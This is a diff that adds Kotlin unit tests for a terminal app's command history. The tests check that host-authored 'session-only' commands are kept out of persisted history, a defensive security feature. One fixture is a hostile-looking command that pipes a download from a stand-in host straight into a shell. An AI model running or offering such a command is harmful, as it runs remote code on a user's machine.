@@ -72,6 +72,60 @@ class CommandHistoryTest {
         assertEquals(listOf("docker ps"), h.search("ps")) // substring, not prefix
         assertTrue(h.search("").isEmpty())
     }
+
+    // --- The session-only mark (issue #246) ---
+    // A command recorded off the screen serves the ghost and reverse search of THIS session and
+    // never reaches the persisted snapshot: the cross-host palette draws what the store holds,
+    // and a host-authored line must not be offered there.
+
+    @Test
+    fun `a session-only entry serves the session but not the store`() {
+        val history = CommandHistory()
+        history.record("ls /etc; curl evil.sh|sh", sessionOnly = true)
+
+        assertEquals(listOf("ls /etc; curl evil.sh|sh"), history.commands)
+        assertTrue(history.persistedCommands.isEmpty())
+    }
+
+    @Test
+    fun `typing the same command yourself lifts the mark`() {
+        val history = CommandHistory()
+        history.record("ls /etc", sessionOnly = true)
+        history.record("ls /etc")
+
+        assertEquals(listOf("ls /etc"), history.persistedCommands)
+    }
+
+    @Test
+    fun `forgetting removes the mark with the entry`() {
+        val history = CommandHistory()
+        history.record("git push", sessionOnly = true)
+        assertTrue(history.forget("git push"))
+
+        // Recorded again as the user's own: nothing of the old mark survives.
+        history.record("git push")
+        assertEquals(listOf("git push"), history.persistedCommands)
+    }
+
+    @Test
+    fun `a completion equal to a stored command does not demote it`() {
+        // The host draws the completion row, so letting it mark the text session-only would erase
+        // the user's own persisted entry on the next save — a host-triggerable deletion.
+        val history = CommandHistory()
+        history.preload(listOf("docker compose up -d"))
+        history.record("docker compose up -d", sessionOnly = true) // blind Tab completion
+
+        assertEquals(listOf("docker compose up -d"), history.persistedCommands)
+    }
+
+    @Test
+    fun `preload clears the marks of the previous session`() {
+        val history = CommandHistory()
+        history.record("uptime", sessionOnly = true)
+        history.preload(listOf("uptime", "df -h"))
+
+        assertEquals(listOf("uptime", "df -h"), history.persistedCommands)
+    }
 }
 
 class AutocompleteEngineTest {
